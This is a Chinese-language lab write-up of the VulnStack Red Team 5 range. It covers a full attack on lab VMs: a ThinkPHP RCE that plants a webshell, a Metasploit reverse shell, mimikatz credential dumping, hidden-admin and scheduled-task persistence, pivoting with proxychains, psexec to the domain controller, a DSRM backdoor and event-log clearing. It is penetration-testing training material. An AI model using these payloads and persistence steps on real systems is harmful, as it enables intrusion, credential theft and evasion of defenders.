---
title: VulnStack-红日5
author: Creexile
date: 2024-04-27 22:19:00
lastMod: 2025-07-26
summary: 'M属性大爆发,msfconsole'
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [Kali, 内网, MSF, 渗透]
---

# vulnstack红队5

**拍快照,拍快照,拍快照!**, 如果要remake没有快照你就偷着乐吧

> 来源: [vulnstack红队5](http://vulnstack.qiyuanxuetang.net/vuln/detail/7/)
>
> 目标: 拿到域控

## 环境配置

本次是自己配置的环境, 密码已经被修改过了, 原密码如下:

- win7: `sun\heart 123.com` & `sun\Administrator dc123.com`
- 2008: `sun\admin 2020.com`

> 此处`sun\admin`指的是sun域下的admin账户

### 网络配置

win7靶机需要你自己上去开启php环境, 以下是我配置的ip地址和密码:

新增两个虚拟网络:

- 192.168.135.0/24 外网环境(Vmnet1)
- 192.168.138.0/24 内网环境(Vmnet2)

### 靶机配置

**win7**

- 外网地址 192.168.135.150
- 内网地址 192.168.138.136
- 账号密码 sun\Administrator dc321.com

![image-20240406163415716](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240406163415716.png)

**win2008**

- 内网地址 192.168.138.138
- 账号密码 sun\admin 2024.com

**kali**

- 外网地址 192.168.135.128

> 攻击机也要放在这个网段下, 否则反弹shell出不来
>
> 简而言之, 就是win7靶机*能ping通剩下的两台机器*(有人没配好就开始做了,我不说是谁)

## 外网渗透

### 信息收集

访问`192.168.135.150`, 发现是`thinkphp`, 版本为`V5.0.22`; 这个版本有远程 RCE 漏洞, 可以写一句话木马然后蚁剑连接

> 使用工具可以跳过手工getshell的步骤

### getshell

蚁剑需要自己配置到kali中

利用payload进行getshell:

> 经过目录扫描可以得到已经有了一个 `add.php` 木马在网站目录, 密码经过爆破是 `admins`

```bash
http://192.168.135.150/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
# 查看 phpinfo, 可以获得站点目录 C:/phpStudy/PHPTutorial/WWW/public

http://192.168.135.150/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^%3C?php%20@eval($_POST[%27shell%27]);%20?^%3E%20%3E%20shell.php
# 写入一句话木马, 蚁剑连接

http://192.168.135.150/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1]
[]= echo ^<?php eval($_POST["shell"]);?^> > "shell.php"
# 其中^来把特殊字符<等转义
```

该一句话木马生成在根目录, 直接用蚁剑连接就好, 连接url如下, 密码为shell

```
http://192.168.135.150/shell.php
```

## 内网渗透

### 信息收集

蚁剑右键**在此处打开终端**

查看本机信息,可以知道我们的权限是`administrator`

```bash
whoami          # 查看当前用户
ipconfig /all	# 查看网络信息, 本机ip,所在域
net user /domain         # 查看域用户  admin, Administrator, Guest, krbtgt, leo
```

有两个网段, 本地连接2明显就是攻击机和我们刚打的靶机的 ip, 那么 `以太网适配器 wk1` 应该是内网, 与我们不相通, 处于一个域DNS名称为`sun.com`的域中

![image-20240406180051412](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240406180051412.png)

```
net view /domain         // 查看有几个域, 本实验无回显
net config workstation   // 查看计算机名、全名、用户名、系统版本、工作站、域、登录域
```

现在知道是在`SUN`域中了

![image-20240426221321975](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240426221321975.png)

```
arp -a	// 查看arp缓存
```

可以看得到有两个网段, 以及可能存活的主机

![image-20240406171007966](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240406171007966.png)

既然知道了域DNS名称, 可以通过 ping 的方式查找主控

```
ping sun.com
// nslookup sun.com
```

![image-20240406181740334](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240406181740334.png)

所以, 我们可以得到的信息是

1. 当前用户直接就是`administrator`, 管理员账户
2. 目标主机所在的网络环境还存在一个`192.168.138.0`的网段, 域控主机为`192.168.138.138`
3. 当前的用户权限不能收集域信息, ( 据说可以用低权限用户来进行域信息收集 )

**用msf继续后面操作: **

生成msf木马后通过蚁剑上传, 设置对应监听后用蚁剑命令行运行以连接( 直接输入`shell.exe`运行msf木马 )

> 如果上传到网站目录下msf可能会偶尔断开连接,而似乎在启动项目录或C盘根目录下没有这个问题(其余没有测试)

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.135.128 lport=10000  -f exe -o shell.exe
```

连接后使用`getsystem`提权, 成功得到SYSTEM权限

![image-20240406175057495](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240406175057495.png)

或者将该木马传入目标机的启动项, 每次启动如果还在监听则会连接, 目录如下:

- `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`
- `C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\StartMenu\Programs\Startup`

对主机进行密码抓取

```bash
load kiwi	# 启动kiwi, 实际是mimikatz工具
creds_all	# 抓取全部
```

成功抓取到域管理员`Administrator`密码: `dc321.com`

![image-20240406181315902](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240406181315902.png)

```bash
migrate 324	# 迁移Metasploit会话到另一个进程(PID)
```

> 可能直接用mimikatz的时候不能运行, 原因是**进程非64位**, 需要迁移我们的会话到一个64位进程的程序上
>
> 如果你实在不知道怎么搞, 你就检查上传的msf木马是不是x64, 如果不是, 重传一个x64的msf木马就可以了

其余信息收集:

```bash
# meterpreter下
hashdump		# 抓取账号和密码哈希值

# shell下
net group "domain computers" /domain		# 查看域内主机  WIN7$
net group "domain controllers" /domain		# 查看域控制器  DC$
net group "domain admins" /domain		# 查看域管理员  Administrator, 即我们 shell 登录的用户权限
# 如果返回大多数是乱码, 执行 chcp 65001更换编码方式
```

### 可跳过

其实在这里可以关闭win7防火墙, 创建隐藏用户, 打开远程服务, 命令如下

```bash
# win7的shell下
netsh advfirewall set allprofiles state off
net user test$ admin123! /add
net localgroup administrators test$ /add	# 添加到管理员组
```

![image-20240426224317660](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240426224317660.png)

```bash
# meterpreter下
run post/windows/manage/enable_rdp
```

![image-20240426223258462](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240426223258462.png)

然后就可以用远程桌面连接了, 用刚抓取的密码或新建的用户即可登录

```bash
rdesktop 192.168.135.150
```

如果是正常攻击, 我们可以塞几个计划任务, 自启动服务

```bash
schtasks /create /tn test /sc minute /mo 1 /tr C:/ProgramData/Microsoft/Windows/Start_Menu/Programs/Startup/win_shell.exe /ru system /f
# 计划任务

sc create "badserver" binpath= "C:/ProgramData/Microsoft/Windows/Start_Menu/Programs/Startup/win_shell.exe"
sc description "badserver" "badserver"		# 设置服务描述
sc config "badserver" start= auto 		# 设置为自启动
net start "badserver" 				# 启动服务
```

**下面不可跳过**

### 横向移动

尝试攻击域控, 首先在msf添加一个通向`192.168.138.0`的路由, 在payload选择界面输入

```bash
route add 192.168.138.0 255.255.255.0 1		// 这个1是会话序号
route print
```

![image-20240406223330346](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240406223330346.png)

msf搭建socks代理

```bash
use auxiliary/server/socks_proxy
set srvhost 127.0.0.1
set version 5
run
```

然后配置`proxychains`, 将socks5服务器指向`127.0.0.1:1080`, 之后便可以使用proxychains将我们的程序代理进内网

```bash
vim /etc/proxychains4.conf		# 可能会有不同
# 将socks4 127.0.0.1 9095改为		socks5 127.0.0.1 1080
# vim编辑ReadOnly不能保存? 退出编辑模式后输入:w !sudo tee %进行保存，之后再使用:q!退出即可
```

![image-20240427104145736](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240427104145736.png)

给win7上传`fscan`工具对域控主机进行端口和存活主机扫描, 这一步可以直接用`proxychains`代理执行nmap命令代替(好慢)

```bash
fscan64.exe -h 192.168.138.138
# proxychains nmap -p 50-500 192.168.138.138
```

本目录下就会多出result.txt:
可以得到域控主机开启了端口445,135,88,139

![image-20240406215540986](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240406215540986.png)

如果是nmap的话就是这样, 如果响应端口扫不出来, 那就是代理配置有问题或者sessions挂了, remake

![image-20240427111109859](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240427111109859.png)

### 攻击域控

`psexec`登录域控通常是要求防火墙关闭的, 所以我们利用sc通过创建服务来远程执行, 关闭Windows 2008的防火墙

在 Windows 7 的 shell 上执行(可能要稍微等一下, 完成了之后瞄一眼dc):

```bash
net use \\192.168.138.138\ipc$ "dc321.com" /user:"administrator"
# 让其与 Windows 2008建立 ipc$ 连接
sc \\192.168.138.138 create unablefirewall binpath= "netsh advfirewall set allprofiles state off"
# 创建关闭防火墙的服务
sc \\192.168.138.138 start unablefirewall
# 立即启动服务
```

![image-20240406185147859](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240406185147859.png)

既然已经获得了域管理员的用户名密码且域控防火墙已经被关闭了，那么我们直接尝试使用psexec登录域控

```bash
use exploit/windows/smb/psexec
set payload windows/meterpreter/bind_tcp
set rhosts 192.168.138.138
set SMBDomain SUN
set SMBUser administrator
set SMBPass dc321.com
run
```

![image-20240407153645227](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240407153645227.png)

> 连不上就重启msf然后重新连接和配置路由, remake解决大部分问题
>
> 重启msf也连不上?那么你的快照就有用了, 全部恢复/重启(包括kali), 省略所有信息收集部分即可

看到这个就可以跑了

![image-20240427115707394](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240427115707394.png)

开启Windows 2008远程桌面

```bash
use post/windows/manage/enable_rdp
set session 2	# background自己找序号, 是psexec登录的那个
run
```

![image-20240407153952245](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240407153952245.png)

之前已经配置过了`proxychains`,可以直接连接远程桌面了, 选项都选yes

```bash
proxychains rdesktop 192.168.138.138
# 账号密码分别为	SUN\Administrator	dc321.com
# 即我们之前抓到的账号密码
```

![image-20240407154345983](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240407154345983.png)

### DSRM后门(直接跳过,我没搞懂)

> 这部分在有远程桌面的时候好做

```bash
ntdsutil	# 进入ntdsutil
set dsrm password	# 设置 DSRM 账户的密码
reset password on server null		# 在当前域控制器上恢复 DSRM 密码
# 输入两次新密码
q	# 退出
```

![image-20240427124609542](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240427124609542.png)

随后修改域控主机的DSRM账户登录方式:
在Windows Server 2000以后的版本操作系统中, 对DSRM使用控制台登录域控制器进行了限制。
我们可以在注册表的`HKLM:\System\CurrentControlSet\Control\Lsa\`中新建`DsrmAdminLogonBehavior`项进行设置，将该新建的项中的值设为0, 1, 2可以分别设置不同的DSRM账户登录方式

- 0: 只有当域控制器重启并进入DSRM模式的时候才可以使用DSRM管理员账号登录域控制器
- 1: 只有当本地AD,DS服务停止才能登录
- 2: 任何情况下都能登录

我们需要将值设置为2, 手动进入注册表新建也可, 以下是命令方式

```bash
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -name "DsrmAdminLogonBehavior" -value 2 -propertyType DWORD
```

![333](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240427125805363.png)

现在我们可以在域成员主机Windows7上通过工具, 使用域控制器的本地Administrator账号哈希传递攻击域控了

可以用meterpreter在`load kiwi`后执行`lsa_dump_sam`来获取哈希值

![image-20240427131133377](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240427131133377.png)

### 日志清理

有远程桌面的权限时手动删除日志：

开始-程序-管理工具-计算机管理-系统工具-事件查看器-清除日志

或win+R, 输入`eventvwr`进入日志查看器, 右键清除

命令执行方式清除:

```bash
PowerShell -Command "& {Clear-Eventlog -Log Application,System,Security}"
```

meterpreter自带清除日志功能

```bash
clearev   # 清除Windows中的应用程序日志，系统日志安全日志

run event_manager -i	# 查看事件日志
run event_manager -c	# 清除事件日志
```

> 利用earthworm搭建socks5反向代理, 将对应文件上传到对应机器( 不是本次实验内容 )

```bash
./ew_for_linux64 -s rcsocks -l 1080 -e 7890		# 攻击机
ew_for_Win.exe -s rssocks -d 192.168.135.128 -e 7890		# win7靶机连接攻击机 ip
start ew_for_Win.exe -s rssocks -d 192.168.135.128 -e 7890 /b		# 可以换成这个, 这个是进行后台执行
```

![image-20240407124724745](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240407124724745.png)
